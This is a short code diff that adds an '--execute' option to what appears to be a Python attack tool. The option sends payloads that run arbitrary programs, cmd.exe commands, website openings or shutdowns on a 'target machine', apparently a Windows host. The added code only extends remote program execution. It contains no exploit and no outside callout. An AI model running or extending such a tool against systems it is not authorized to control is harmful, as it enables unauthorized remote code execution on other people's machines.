@@ -140,6 +140,16 @@ if __name__ == "__main__":
         metavar="command",
         help="Command to execute on the target",
     )
+    temp = attack_action.add_argument(
+        "-e",
+        "--execute",
+        nargs="+",
+        default=None,
+        action=ModeOptionalAction,
+        modes=("minimize", "maximize"),
+        metavar=("program", "args"),
+        help="Execute a program with arguments on the target machine",
+    )
     attack_action.add_argument(
         "-s",
         "--shutdown",
@@ -183,6 +193,15 @@ if __name__ == "__main__":
             payload = pkg_website(args.website)
         elif args.command:
             payload = pkg_execute("cmd.exe", f'/D /C "{args.command}"', "minimize")
+        elif args.execute:
+            match args.execute:
+                case [mode, [program]]:
+                    args_list = ""
+                case [mode, [program, args_list]]:
+                    pass
+                case _:
+                    parser.error("Invalid execute arguments: expected [program] or [program, args_list]")
+            payload = pkg_execute(program, args_list, "normal" if mode is None else mode)
         elif args.shutdown is not None:
             match args.shutdown:
                 case []:
